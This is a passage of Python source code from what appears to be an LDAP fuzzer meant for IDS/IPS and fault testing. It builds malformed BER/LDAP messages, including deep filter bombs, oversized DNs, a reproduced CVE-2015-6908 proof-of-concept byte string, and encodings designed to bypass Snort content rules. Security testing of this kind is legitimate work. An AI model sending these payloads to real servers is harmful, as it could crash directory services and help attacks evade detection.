import random
import struct

# ---------------------------------------------------------------------------
# LDAP mutation strategies for IDS/IPS fault & vulnerability testing.
#
# Grounded in:
#   - RFC 4511  (LDAPv3 protocol operations, wire format)
#   - RFC 4513  (LDAP authentication methods, StartTLS)
#   - RFC 4515  (LDAP search filter string representation)
#   - X.690     (ASN.1 BER/DER encoding rules)
#   - CVE-2015-6908  (OpenLDAP ber_get_next assert crash via crafted BER)
#   - CVE-2020-12243 (OpenLDAP nested boolean filter crash)
#   - CVE-2023-2953  (OpenLDAP NULL pointer deref in liblber)
#   - CVE-2023-28283 (Windows LDAP unauthenticated RCE)
#   - CVE-2024-49112 (LDAPNightmare: Windows LDAP zero-click RCE)
#   - CVE-2024-49113 (LDAPNightmare: Windows LDAP DoS)
#
# Snort detection model: Snort 3 has NO dedicated LDAP inspector.
# LDAP is caught ONLY by TEXT RULES (gid 1, protocol-ldap.rules: content
# matching on port 389/636). This is the same weak detection model as SNMP.
# Consequences: no BER-aware reassembly, no stateful tracking, content rules
# are brittle against non-minimal BER encoding and TCP segmentation.
#
# Every payload is a raw TCP payload (no TCP/IP framing -- the transport layer
# adds that).  build_ldap_payload() returns (payload, dst_port).  Each payload
# begins with a structurally valid outer SEQUENCE (0x30) + messageID so Snort's
# fast-pattern matcher binds the flow as LDAP BEFORE hitting the malicious bytes.
# ---------------------------------------------------------------------------

LDAP_STRATEGIES = [
    "ber_length_overflow",
    "ber_nonminimal_encoding",
    "ber_indefinite_constructed",
    "truncated_tlv",
    "bind_auth_confusion",
    "search_filter_bomb",
    "search_request_malform",
    "message_id_confusion",
    "modify_add_dn_overflow",
    "extended_starttls_abuse",
    "control_injection",
    "nested_sequence_bomb",
    "tcp_segment_evasion",
    "version_pdu_tag_confusion",
]

LDAP_WEIGHTS = [12, 8, 6, 10, 10, 14, 8, 5, 8, 6, 8, 5, 12, 4]

LDAP_STRATEGY_LABELS = {
    "ber_length_overflow":         "BER Length Overflow",
    "ber_nonminimal_encoding":     "BER Non-Minimal Encoding",
    "ber_indefinite_constructed":  "BER Indefinite / Constructed",
    "truncated_tlv":               "Truncated TLV",
    "bind_auth_confusion":         "Bind Auth Confusion",
    "search_filter_bomb":          "Search Filter Bomb",
    "search_request_malform":      "Search Request Malform",
    "message_id_confusion":        "Message ID Confusion",
    "modify_add_dn_overflow":      "Modify/Add DN Overflow",
    "extended_starttls_abuse":     "Extended / StartTLS Abuse",
    "control_injection":           "Control Injection",
    "nested_sequence_bomb":        "Nested SEQUENCE Bomb",
    "tcp_segment_evasion":         "TCP Segment Evasion",
    "version_pdu_tag_confusion":   "Version / PDU Tag Confusion",
}

# ── BER / ASN.1 primitives ─────────────────────────────────────────────────
_T_BOOLEAN = 0x01
_T_INTEGER = 0x02
_T_OCTET_STRING = 0x04
_T_NULL = 0x05
_T_OID = 0x06
_T_ENUMERATED = 0x0A
_T_SEQUENCE = 0x30
_T_SET = 0x31

# LDAP Application-class tags (constructed unless noted)
_APP_BIND_REQUEST = 0x60       # [APPLICATION 0] constructed
_APP_BIND_RESPONSE = 0x61      # [APPLICATION 1] constructed
_APP_UNBIND_REQUEST = 0x42     # [APPLICATION 2] primitive
_APP_SEARCH_REQUEST = 0x63     # [APPLICATION 3] constructed
_APP_SEARCH_ENTRY = 0x64       # [APPLICATION 4] constructed
_APP_SEARCH_DONE = 0x65        # [APPLICATION 5] constructed
_APP_SEARCH_REF = 0x73         # [APPLICATION 19] constructed
_APP_MODIFY_REQUEST = 0x66     # [APPLICATION 6] constructed
_APP_MODIFY_RESPONSE = 0x67    # [APPLICATION 7] constructed
_APP_ADD_REQUEST = 0x68        # [APPLICATION 8] constructed
_APP_ADD_RESPONSE = 0x69       # [APPLICATION 9] constructed
_APP_DEL_REQUEST = 0x4A        # [APPLICATION 10] primitive
_APP_DEL_RESPONSE = 0x6B       # [APPLICATION 11] constructed
_APP_MODDN_REQUEST = 0x6C      # [APPLICATION 12] constructed
_APP_MODDN_RESPONSE = 0x6D     # [APPLICATION 13] constructed
_APP_COMPARE_REQUEST = 0x6E    # [APPLICATION 14] constructed
_APP_COMPARE_RESPONSE = 0x6F   # [APPLICATION 15] constructed
_APP_ABANDON_REQUEST = 0x50    # [APPLICATION 16] primitive
_APP_EXTENDED_REQUEST = 0x77   # [APPLICATION 23] constructed
_APP_EXTENDED_RESPONSE = 0x78  # [APPLICATION 24] constructed
_APP_INTERMEDIATE = 0x79       # [APPLICATION 25] constructed

# Search filter context-specific tags
_FILTER_AND = 0xA0
_FILTER_OR = 0xA1
_FILTER_NOT = 0xA2
_FILTER_EQUALITY = 0xA3
_FILTER_SUBSTRINGS = 0xA4
_FILTER_GE = 0xA5
_FILTER_LE = 0xA6
_FILTER_PRESENT = 0x87         # context-specific primitive 7
_FILTER_APPROX = 0xA8
_FILTER_EXTENSIBLE = 0xA9

# Well-known OIDs
_OID_STARTTLS = b"1.3.6.1.4.1.1466.20037"
_OID_PAGED_RESULTS = b"1.2.840.113556.1.4.319"
_OID_WHO_AM_I = b"1.3.6.1.4.1.4203.1.11.3"

# Max payload to stay within reason
_MAX_PAYLOAD = 65000


def _ber_len(n: int) -> bytes:
    """Minimal definite-form BER length."""
    if n < 0x80:
        return bytes([n])
    out = b""
    v = n
    while v > 0:
        out = bytes([v & 0xFF]) + out
        v >>= 8
    return bytes([0x80 | len(out)]) + out


def _ber_len_long(n: int, octets: int) -> bytes:
    """Force a long-form length with exactly `octets` value bytes (non-minimal
    encoding -- used to desync parsers that match on specific byte patterns)."""
    octets = max(1, min(octets, 0x7E))
    body = n.to_bytes(octets, "big", signed=False) if n < (1 << (8 * octets)) else (b"\xFF" * octets)
    return bytes([0x80 | octets]) + body


def _tlv(tag: int, value: bytes) -> bytes:
    return bytes([tag]) + _ber_len(len(value)) + value


def _integer(value: int) -> bytes:
    """Proper minimal two's-complement INTEGER."""
    if value == 0:
        body = b"\x00"
    else:
        length = (value.bit_length() + 8) // 8 if value > 0 else (((-value - 1).bit_length() + 8) // 8)
        body = value.to_bytes(length, "big", signed=True)
        while len(body) > 1 and ((body[0] == 0x00 and not (body[1] & 0x80)) or
                                 (body[0] == 0xFF and (body[1] & 0x80))):
            body = body[1:]
    return _tlv(_T_INTEGER, body)


def _raw_integer(body: bytes) -> bytes:
    """INTEGER with an arbitrary (possibly illegal) value field."""
    return _tlv(_T_INTEGER, body)


def _octet_string(data: bytes) -> bytes:
    return _tlv(_T_OCTET_STRING, data)


def _boolean(val: bool) -> bytes:
    return _tlv(_T_BOOLEAN, b"\xFF" if val else b"\x00")


def _enumerated(value: int) -> bytes:
    if value == 0:
        body = b"\x00"
    else:
        length = (value.bit_length() + 8) // 8 if value > 0 else (((-value - 1).bit_length() + 8) // 8)
        body = value.to_bytes(length, "big", signed=True)
    return _tlv(_T_ENUMERATED, body)


def _sequence(content: bytes) -> bytes:
    return _tlv(_T_SEQUENCE, content)


def _ctx(tag: int, content: bytes) -> bytes:
    """Context-specific (or application) TLV."""
    return _tlv(tag, content)


def _clamp(payload: bytes) -> bytes:
    return payload[:_MAX_PAYLOAD]


def _mid() -> int:
    """Random LDAP message ID."""
    return random.randint(1, 0x7FFFFFFF)


# ── LDAP message builders ─────────────────────────────────────────────────

def _ldap_message(msg_id: int, protocol_op: bytes, controls: bytes = b"") -> bytes:
    """Build an LDAPMessage SEQUENCE."""
    body = _integer(msg_id) + protocol_op
    if controls:
        body += _ctx(0xA0, controls)
    return _sequence(body)


def _simple_bind(msg_id: int = None, version: int = 3, dn: bytes = b"",
                 password: bytes = b"") -> bytes:
    """Simple BindRequest."""
    if msg_id is None:
        msg_id = _mid()
    bind_body = _integer(version) + _octet_string(dn) + _ctx(0x80, password)
    return _ldap_message(msg_id, _ctx(_APP_BIND_REQUEST, bind_body))


def _equality_filter(attr: bytes, value: bytes) -> bytes:
    """equalityMatch [3] SEQUENCE { attributeDesc, assertionValue }."""
    return _ctx(_FILTER_EQUALITY, _octet_string(attr) + _octet_string(value))


def _present_filter(attr: bytes) -> bytes:
    """present [7] AttributeDescription (primitive)."""
    return bytes([_FILTER_PRESENT]) + _ber_len(len(attr)) + attr


def _search_request(msg_id: int = None, base_dn: bytes = b"dc=example,dc=com",
                    scope: int = 2, deref: int = 0, size_limit: int = 0,
                    time_limit: int = 0, types_only: bool = False,
                    filter_bytes: bytes = None, attributes: list = None) -> bytes:
    """SearchRequest."""
    if msg_id is None:
        msg_id = _mid()
    if filter_bytes is None:
        filter_bytes = _present_filter(b"objectClass")
    attrs = b""
    for a in (attributes or []):
        attrs += _octet_string(a if isinstance(a, bytes) else a.encode())
    attr_seq = _sequence(attrs)
    search_body = (_octet_string(base_dn) + _enumerated(scope) +
                   _enumerated(deref) + _integer(size_limit) +
                   _integer(time_limit) + _boolean(types_only) +
                   filter_bytes + attr_seq)
    return _ldap_message(msg_id, _ctx(_APP_SEARCH_REQUEST, search_body))


def _modify_request(msg_id: int = None, dn: bytes = b"cn=test,dc=example,dc=com",
                    changes: bytes = b"") -> bytes:
    """ModifyRequest with pre-built changes SEQUENCE content."""
    if msg_id is None:
        msg_id = _mid()
    if not changes:
        # Default: add objectClass=top
        attr_val = _sequence(_octet_string(b"objectClass") +
                             _tlv(_T_SET, _octet_string(b"top")))
        changes = _sequence(_enumerated(0) + attr_val)  # operation=add(0)
    mod_body = _octet_string(dn) + _sequence(changes)
    return _ldap_message(msg_id, _ctx(_APP_MODIFY_REQUEST, mod_body))


def _add_request(msg_id: int = None, dn: bytes = b"cn=test,dc=example,dc=com",
                 attrs: bytes = b"") -> bytes:
    """AddRequest."""
    if msg_id is None:
        msg_id = _mid()
    if not attrs:
        attrs = _sequence(_octet_string(b"objectClass") +
                          _tlv(_T_SET, _octet_string(b"top")))
    add_body = _octet_string(dn) + _sequence(attrs)
    return _ldap_message(msg_id, _ctx(_APP_ADD_REQUEST, add_body))


def _delete_request(msg_id: int = None, dn: bytes = b"cn=test,dc=example,dc=com") -> bytes:
    """DelRequest [APPLICATION 10] LDAPDN (primitive)."""
    if msg_id is None:
        msg_id = _mid()
    # DelRequest is a primitive octet string with application tag 10
    del_op = bytes([_APP_DEL_REQUEST]) + _ber_len(len(dn)) + dn
    return _ldap_message(msg_id, del_op)


def _extended_request(msg_id: int = None, oid: bytes = _OID_STARTTLS,
                      value: bytes = b"") -> bytes:
    """ExtendedRequest."""
    if msg_id is None:
        msg_id = _mid()
    ext_body = _ctx(0x80, oid)  # requestName [0]
    if value:
        ext_body += _ctx(0x81, value)  # requestValue [1]
    return _ldap_message(msg_id, _ctx(_APP_EXTENDED_REQUEST, ext_body))


def _control(oid: bytes, critical: bool = False, value: bytes = b"") -> bytes:
    """Build a single Control SEQUENCE."""
    body = _octet_string(oid)
    if critical:
        body += _boolean(True)
    if value:
        body += _octet_string(value)
    return _sequence(body)


# ── Strategy 1: BER length-field overflow (CVE-2015-6908) ─────────────────
def _build_ber_length_overflow():
    """Long-form BER length declaring far more bytes than present. Targets the
    length-parsing arithmetic (heap alloc / OOB read / assertion failure)."""
    variant = random.choice([
        "outer_4gb", "msgid_huge", "dn_huge", "five_octet_len",
        "len_gt_remaining", "bind_body_lie", "wrap_offset", "cve_2015_6908",
    ])
    mid = _mid()
    if variant == "outer_4gb":
        body = _integer(mid) + _simple_bind(mid)[_simple_bind(mid).index(0x60):]
        inner = _integer(mid) + _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(b"") + _ctx(0x80, b""))
        return bytes([_T_SEQUENCE]) + _ber_len_long(0xFFFFFFFF, 4) + inner, 389
    if variant == "msgid_huge":
        evil_mid = bytes([_T_INTEGER]) + _ber_len_long(0x7FFFFFFF, 4) + b"\x01"
        bind = _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(b"") + _ctx(0x80, b""))
        return _sequence(evil_mid + bind), 389
    if variant == "dn_huge":
        evil_dn = bytes([_T_OCTET_STRING]) + _ber_len_long(0x7FFFFFFF, 4) + b"dc=x"
        bind = _ctx(_APP_BIND_REQUEST,
                    _integer(3) + evil_dn + _ctx(0x80, b""))
        return _ldap_message(mid, bind), 389
    if variant == "five_octet_len":
        inner = _integer(mid) + _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(b"") + _ctx(0x80, b""))
        return bytes([_T_SEQUENCE, 0x85]) + b"\xFF\xFF\xFF\xFF\xFF" + inner, 389
    if variant == "len_gt_remaining":
        bind = _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(b"") + _ctx(0x80, b""))
        inner = _integer(mid) + bind
        return bytes([_T_SEQUENCE]) + _ber_len(len(inner) + 5000) + inner, 389
    if variant == "bind_body_lie":
        body = _integer(3) + _octet_string(b"") + _ctx(0x80, b"")
        evil_bind = bytes([_APP_BIND_REQUEST]) + _ber_len(len(body) + 4096) + body
        return _ldap_message(mid, evil_bind), 389
    if variant == "wrap_offset":
        inner = _integer(mid) + _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(b"") + _ctx(0x80, b""))
        evil_dn = bytes([_T_OCTET_STRING]) + _ber_len_long(0xFFFFFFFFFFFFFFF0, 8) + b"x"
        return _sequence(_integer(mid) + evil_dn), 389
    # cve_2015_6908: reproduces the exact PoC pattern (tag 0xFF + non-minimal length)
    return b"\xff\x84\x84\x84\x84\x84\x77\x83\x0a\x62\x3e\x59\x32\x00\x00\x00\x2f", 389


# ── Strategy 2: Non-minimal BER encoding (Snort content-rule bypass) ──────
def _build_ber_nonminimal_encoding():
    """Same logical message encoded with non-minimal BER lengths so that
    Snort's fixed content patterns fail to match."""
    variant = random.choice([
        "nonmin_1byte", "nonmin_4byte", "nonmin_leading_zeros",
        "nonmin_all", "nonmin_msgid", "mixed",
    ])
    mid = _mid()
    dn = b"dc=example,dc=com"
    password = b"secret123"
    if variant == "nonmin_1byte":
        evil_dn = bytes([_T_OCTET_STRING]) + _ber_len_long(len(dn), 1) + dn
        bind = _ctx(_APP_BIND_REQUEST, _integer(3) + evil_dn + _ctx(0x80, password))
        return _ldap_message(mid, bind), 389
    if variant == "nonmin_4byte":
        evil_dn = bytes([_T_OCTET_STRING]) + _ber_len_long(len(dn), 4) + dn
        bind = _ctx(_APP_BIND_REQUEST, _integer(3) + evil_dn + _ctx(0x80, password))
        return _ldap_message(mid, bind), 389
    if variant == "nonmin_leading_zeros":
        evil_dn = bytes([_T_OCTET_STRING, 0x83, 0x00, 0x00, len(dn)]) + dn
        bind = _ctx(_APP_BIND_REQUEST, _integer(3) + evil_dn + _ctx(0x80, password))
        return _ldap_message(mid, bind), 389
    if variant == "nonmin_all":
        ver = bytes([_T_INTEGER]) + _ber_len_long(1, 4) + b"\x03"
        dn_enc = bytes([_T_OCTET_STRING]) + _ber_len_long(len(dn), 4) + dn
        pw = bytes([0x80]) + _ber_len_long(len(password), 4) + password
        bind_body = ver + dn_enc + pw
        bind = bytes([_APP_BIND_REQUEST]) + _ber_len_long(len(bind_body), 4) + bind_body
        mid_enc = bytes([_T_INTEGER]) + _ber_len_long(1, 4) + b"\x01"
        body = mid_enc + bind
        return bytes([_T_SEQUENCE]) + _ber_len_long(len(body), 4) + body, 389
    if variant == "nonmin_msgid":
        mid_enc = bytes([_T_INTEGER]) + _ber_len_long(4, 3) + mid.to_bytes(4, "big")
        bind = _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(dn) + _ctx(0x80, password))
        return _sequence(mid_enc + bind), 389
    # mixed: outer indefinite, inner non-minimal
    evil_dn = bytes([_T_OCTET_STRING]) + _ber_len_long(len(dn), 2) + dn
    bind = _ctx(_APP_BIND_REQUEST, _integer(3) + evil_dn + _ctx(0x80, password))
    body = _integer(mid) + bind
    return bytes([_T_SEQUENCE]) + _ber_len_long(len(body), 3) + body, 389


# ── Strategy 3: Indefinite form + constructed primitives (RFC 4511 S5.1) ──
def _build_ber_indefinite_constructed(payload_override=None):
    """Use BER constructs that RFC 4511 explicitly forbids: indefinite-form
    lengths, constructed octet strings, non-standard boolean encoding."""
    if payload_override is not None:
        mid = _mid()
        evil_dn = bytes([_T_OCTET_STRING, 0x80]) + payload_override + b"\x00\x00"
        bind = _ctx(_APP_BIND_REQUEST,
                    _integer(3) + evil_dn + _ctx(0x80, b""))
        body = _integer(mid) + bind
        return bytes([_T_SEQUENCE, 0x80]) + body + b"\x00\x00", 389
    variant = random.choice([
        "indefinite_outer", "indefinite_bind", "constructed_octet",
        "boolean_nonstandard", "multibyte_tag", "eoc_injection",
    ])
    mid = _mid()
    dn = b"dc=example,dc=com"
    if variant == "indefinite_outer":
        body = _integer(mid) + _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(dn) + _ctx(0x80, b""))
        return bytes([_T_SEQUENCE, 0x80]) + body + b"\x00\x00", 389
    if variant == "indefinite_bind":
        body = _integer(3) + _octet_string(dn) + _ctx(0x80, b"")
        bind = bytes([_APP_BIND_REQUEST, 0x80]) + body + b"\x00\x00"
        return _ldap_message(mid, bind), 389
    if variant == "constructed_octet":
        # Constructed octet string (0x24) for DN instead of primitive 0x04
        chunk1 = _octet_string(b"dc=example")
        chunk2 = _octet_string(b",dc=com")
        evil_dn = _tlv(0x24, chunk1 + chunk2)  # constructed OCTET STRING
        bind = _ctx(_APP_BIND_REQUEST, _integer(3) + evil_dn + _ctx(0x80, b""))
        return _ldap_message(mid, bind), 389
    if variant == "boolean_nonstandard":
        # BER allows any non-zero for TRUE; LDAP mandates 0xFF
        # SearchRequest with typesOnly encoded as 0x01, 0x7F, 0x80
        bad_bool = bytes([_T_BOOLEAN, 0x01, random.choice([0x01, 0x7F, 0x80])])
        search_body = (_octet_string(dn) + _enumerated(2) + _enumerated(0) +
                       _integer(0) + _integer(0) + bad_bool +
                       _present_filter(b"objectClass") + _sequence(b""))
        return _ldap_message(mid, _ctx(_APP_SEARCH_REQUEST, search_body)), 389
    if variant == "multibyte_tag":
        # Multi-byte tag for INTEGER (normally 0x02). Tag 0x1F 0x02 encodes
        # universal class, primitive, tag number 2 in long form.
        evil_ver = bytes([0x1F, 0x02, 0x01, 0x03])  # multi-byte tag INTEGER value 3
        bind = _ctx(_APP_BIND_REQUEST,
                    evil_ver + _octet_string(dn) + _ctx(0x80, b""))
        return _ldap_message(mid, bind), 389
    # eoc_injection: inject 00 00 (EOC) markers at unexpected positions
    body = _integer(mid) + b"\x00\x00" + _ctx(_APP_BIND_REQUEST,
                _integer(3) + _octet_string(dn) + b"\x00\x00" + _ctx(0x80, b""))
    return _sequence(body), 389


# ── Strategy 4: Truncated TLV ─────────────────────────────────────────────
def _build_truncated_tlv():
    """Declared length exceeds the bytes actually present. Targets ber_get_next
    style readers that may OOB-read or assert."""
    variant = random.choice([
        "outer", "bind_dn", "bind_body", "search_filter",
        "mid_length", "mid_tag", "missing_value",
    ])
    mid = _mid()
    if variant == "outer":
        full = _simple_bind(mid)
        cut = len(full) // 2
        return full[:cut], 389
    if variant == "bind_dn":
        evil_dn = bytes([_T_OCTET_STRING, 200]) + b"dc="  # claims 200 bytes, gives 3
        bind = _ctx(_APP_BIND_REQUEST, _integer(3) + evil_dn)
        return _ldap_message(mid, bind), 389
    if variant == "bind_body":
        evil_bind = bytes([_APP_BIND_REQUEST, 0x7F])  # claims 127 bytes, none follow
        return _ldap_message(mid, evil_bind), 389
    if variant == "search_filter":
        evil_filter = bytes([_FILTER_AND, 0x40])  # AND claims 64 bytes
        search = _ctx(_APP_SEARCH_REQUEST,
                      _octet_string(b"dc=x") + _enumerated(2) + _enumerated(0) +
                      _integer(0) + _integer(0) + _boolean(False) +
                      evil_filter + _sequence(b""))
        return _ldap_message(mid, search), 389
    if variant == "mid_length":
        # Cut in the middle of a multi-byte length field
        inner = _integer(mid) + _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(b"dc=example,dc=com") + _ctx(0x80, b""))
        full = bytes([_T_SEQUENCE]) + _ber_len_long(len(inner), 4)
        return full[:3] + inner[:5], 389  # partial length + partial body
    if variant == "mid_tag":
        # Just the SEQUENCE tag byte alone
        return bytes([_T_SEQUENCE]), 389
    # missing_value: BindRequest with version integer but no DN or password
    bind = _ctx(_APP_BIND_REQUEST, _integer(3))
    return _ldap_message(mid, bind), 389


# ── Strategy 5: Bind authentication confusion ─────────────────────────────
def _build_bind_auth_confusion():
    """Malformed BindRequests: bad version, empty-DN-with-password, SASL abuse,
    reserved context tags in AuthenticationChoice."""
    variant = random.choice([
        "version_zero", "version_negative", "version_huge", "empty_dn_password",
        "sasl_unknown", "sasl_oversized", "reserved_auth_tag", "padded_version",
    ])
    mid = _mid()
    dn = b"cn=admin,dc=example,dc=com"
    if variant == "version_zero":
        return _ldap_message(mid, _ctx(_APP_BIND_REQUEST,
                    _integer(0) + _octet_string(dn) + _ctx(0x80, b"secret"))), 389
    if variant == "version_negative":
        return _ldap_message(mid, _ctx(_APP_BIND_REQUEST,
                    _raw_integer(b"\xFF") + _octet_string(dn) + _ctx(0x80, b"secret"))), 389
    if variant == "version_huge":
        return _ldap_message(mid, _ctx(_APP_BIND_REQUEST,
                    _raw_integer(b"\x7F\xFF\xFF\xFF") + _octet_string(dn) + _ctx(0x80, b"secret"))), 389
    if variant == "empty_dn_password":
        # RFC 4513: servers SHOULD reject empty DN + non-empty password
        return _ldap_message(mid, _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(b"") + _ctx(0x80, b"secret123"))), 389
    if variant == "sasl_unknown":
        # SASL bind with unknown mechanism
        mech = random.choice([b"EVIL-MECH", b"X" * 500, b"\x00\xFF\x00",
                               b"GSSAPI\x00EXTRA", b""])
        sasl_body = _octet_string(mech)
        creds = _octet_string(bytes(random.choices(range(256), k=random.randint(0, 200))))
        sasl = _sequence(sasl_body + creds)
        return _ldap_message(mid, _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(b"") + _ctx(0xA3, sasl_body + creds))), 389
    if variant == "sasl_oversized":
        # SASL credentials > 64KB
        big_creds = bytes(random.choices(range(256), k=60000))
        sasl_body = _octet_string(b"GSSAPI") + _octet_string(big_creds)
        return _clamp(_ldap_message(mid, _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(b"") + _ctx(0xA3, sasl_body)))), 389
    if variant == "reserved_auth_tag":
        # Use context-specific tags [1] and [2] which are reserved
        tag = random.choice([0x81, 0x82, 0x84, 0xA0])
        return _ldap_message(mid, _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(dn) + _ctx(tag, b"reserved_auth"))), 389
    # padded_version: non-minimal version integer 0x00 0x00 0x03
    return _ldap_message(mid, _ctx(_APP_BIND_REQUEST,
                _raw_integer(b"\x00\x00\x03") + _octet_string(dn) + _ctx(0x80, b"secret"))), 389


# ── Strategy 6: Search filter bomb (CVE-2020-12243) ──────────────────────
def _build_search_filter_bomb():
    """Deeply nested search filters, wildcard DoS, malformed filter BER."""
    variant = random.choice([
        "deep_and", "deep_or_not", "wildcard_dos", "zero_children",
        "wrong_filter_tag", "substring_malform", "giant_attr",
    ])
    mid = _mid()
    base = b"dc=example,dc=com"
    if variant == "deep_and":
        # CVE-2020-12243 pattern: deeply nested boolean filters
        inner = _equality_filter(b"cn", b"test")
        for _ in range(random.randint(100, 500)):
            inner = _ctx(_FILTER_AND, inner)
        return _clamp(_search_request(mid, base, filter_bytes=inner)), 389
    if variant == "deep_or_not":
        inner = _present_filter(b"objectClass")
        for i in range(random.randint(80, 300)):
            if i % 2 == 0:
                inner = _ctx(_FILTER_OR, inner)
            else:
                inner = _ctx(_FILTER_NOT, inner)
        return _clamp(_search_request(mid, base, filter_bytes=inner)), 389
    if variant == "wildcard_dos":
        # SubstringFilter with many wildcard substrings
        attr = _octet_string(b"cn")
        subs = b""
        for _ in range(random.randint(20, 100)):
            subs += _ctx(0x81, bytes(random.choices(range(97, 123), k=1)))  # any [1]
        evil = _ctx(_FILTER_SUBSTRINGS, attr + _sequence(subs))
        return _search_request(mid, base, filter_bytes=evil), 389
    if variant == "zero_children":
        # AND/OR with zero children (empty SET)
        evil = _ctx(random.choice([_FILTER_AND, _FILTER_OR]), b"")
        return _search_request(mid, base, filter_bytes=evil), 389
    if variant == "wrong_filter_tag":
        # Use invalid/undefined context-specific tags for filter
        bad_tag = random.choice([0xAA, 0xAB, 0xAF, 0xBF, 0x80, 0x90])
        evil = _ctx(bad_tag, _octet_string(b"cn") + _octet_string(b"*"))
        return _search_request(mid, base, filter_bytes=evil), 389
    if variant == "substring_malform":
        # SubstringFilter with oversized initial/final values
        attr = _octet_string(b"cn")
        big_initial = _ctx(0x80, b"A" * 10000)  # initial [0]
        big_final = _ctx(0x82, b"Z" * 10000)    # final [2]
        evil = _ctx(_FILTER_SUBSTRINGS, attr + _sequence(big_initial + big_final))
        return _clamp(_search_request(mid, base, filter_bytes=evil)), 389
    # giant_attr: attribute description > 10KB
    big_attr = b"x" * 10000
    evil = _equality_filter(big_attr, b"value")
    return _clamp(_search_request(mid, base, filter_bytes=evil)), 389


# ── Strategy 7: Search request malform ────────────────────────────────────
def _build_search_request_malform():
    """Invalid scope, derefAliases, limits, oversized baseDN, massive attrs."""
    variant = random.choice([
        "invalid_scope", "invalid_deref", "negative_limits", "huge_limits",
        "oversized_basedn", "massive_attrs", "nul_in_basedn",
    ])
    mid = _mid()
    base = b"dc=example,dc=com"
    filt = _present_filter(b"objectClass")
    if variant == "invalid_scope":
        scope = random.choice([3, 127, 255])
        search_body = (_octet_string(base) + _enumerated(scope) + _enumerated(0) +
                       _integer(0) + _integer(0) + _boolean(False) +
                       filt + _sequence(b""))
        return _ldap_message(mid, _ctx(_APP_SEARCH_REQUEST, search_body)), 389
    if variant == "invalid_deref":
        deref = random.choice([4, 127, 255])
        search_body = (_octet_string(base) + _enumerated(2) + _enumerated(deref) +
                       _integer(0) + _integer(0) + _boolean(False) +
                       filt + _sequence(b""))
        return _ldap_message(mid, _ctx(_APP_SEARCH_REQUEST, search_body)), 389
    if variant == "negative_limits":
        search_body = (_octet_string(base) + _enumerated(2) + _enumerated(0) +
                       _raw_integer(b"\xFF\xFF\xFF\xFF") +
                       _raw_integer(b"\xFF\xFF\xFF\xFF") +
                       _boolean(False) + filt + _sequence(b""))
        return _ldap_message(mid, _ctx(_APP_SEARCH_REQUEST, search_body)), 389
    if variant == "huge_limits":
        search_body = (_octet_string(base) + _enumerated(2) + _enumerated(0) +
                       _integer(0x7FFFFFFF) + _integer(0x7FFFFFFF) +
                       _boolean(False) + filt + _sequence(b""))
        return _ldap_message(mid, _ctx(_APP_SEARCH_REQUEST, search_body)), 389
    if variant == "oversized_basedn":
        big_dn = b",".join([b"cn=" + bytes([random.randint(97, 122)] * 4)
                            for _ in range(2000)])
        return _clamp(_search_request(mid, big_dn, filter_bytes=filt)), 389
    if variant == "massive_attrs":
        attrs = [f"attr{i}".encode() for i in range(1500)]
        return _clamp(_search_request(mid, base, filter_bytes=filt, attributes=attrs)), 389
    # nul_in_basedn: embedded NUL bytes
    evil_dn = b"dc=example\x00\x00,dc=com\x00"
    return _search_request(mid, evil_dn, filter_bytes=filt), 389


# ── Strategy 8: Message ID confusion ─────────────────────────────────────
def _build_message_id_confusion():
    """Boundary and illegal message ID values. Tests IDS correlation logic."""
    variant = random.choice([
        "id_zero", "id_negative", "id_max", "id_nonminimal",
        "id_reuse", "id_oversized_int", "id_zero_len",
    ])
    base_bind = lambda mid_bytes: _sequence(mid_bytes + _ctx(_APP_BIND_REQUEST,
                    _integer(3) + _octet_string(b"") + _ctx(0x80, b"")))
    if variant == "id_zero":
        return _simple_bind(0), 389
    if variant == "id_negative":
        return base_bind(_raw_integer(b"\xFF\xFF\xFF\xFF")), 389  # -1
    if variant == "id_max":
        return _simple_bind(0x7FFFFFFF), 389
    if variant == "id_nonminimal":
        # messageID 1 encoded with 5 leading zero bytes
        return base_bind(_raw_integer(b"\x00\x00\x00\x00\x01")), 389
    if variant == "id_reuse":
        # Two pipelined requests with the same messageID
        mid = _mid()
        msg1 = _simple_bind(mid)
        msg2 = _search_request(mid)
        return msg1 + msg2, 389
    if variant == "id_oversized_int":
        # 9-byte integer > 2^31
        return base_bind(_raw_integer(b"\x7F" + b"\xFF" * 8)), 389
    # id_zero_len: 0-length INTEGER for messageID (illegal per BER)
    return _sequence(bytes([_T_INTEGER, 0x00]) +
                     _ctx(_APP_BIND_REQUEST,
                          _integer(3) + _octet_string(b"") + _ctx(0x80, b""))), 389


# ── Strategy 9: Modify/Add/Delete DN overflow ────────────────────────────
def _build_modify_add_dn_overflow():
    """Oversized DNs and attribute values in Modify/Add/ModDN/Delete ops."""
    variant = random.choice([
        "huge_dn_modify", "huge_dn_add", "huge_dn_delete", "deep_rdn",
        "nul_dn", "utf8_boundary", "huge_attr_value", "circular_moddn",
    ])
    mid = _mid()
    if variant == "huge_dn_modify":
        big_dn = b"cn=" + b"A" * 60000
        return _clamp(_modify_request(mid, big_dn)), 389
    if variant == "huge_dn_add":
        big_dn = b"cn=" + b"B" * 60000
        return _clamp(_add_request(mid, big_dn)), 389
    if variant == "huge_dn_delete":
        big_dn = b"cn=" + b"C" * 60000
        return _clamp(_delete_request(mid, big_dn)), 389
    if variant == "deep_rdn":
        components = [b"cn=a"] * 500
        deep_dn = b",".join(components)
        return _clamp(_modify_request(mid, deep_dn)), 389
    if variant == "nul_dn":
        evil_dn = b"cn=test\x00admin\x00,dc=example\x00,dc=com"
        return _modify_request(mid, evil_dn), 389
    if variant == "utf8_boundary":
        # Invalid UTF-8 sequences in DN
        evil_dn = b"cn=\xff\xfe\x80\xc0\xaf,dc=example,dc=com"
        return _modify_request(mid, evil_dn), 389
    if variant == "huge_attr_value":
        big_val = bytes(random.choices(range(256), k=50000))
        attr_mod = _sequence(_octet_string(b"description") +
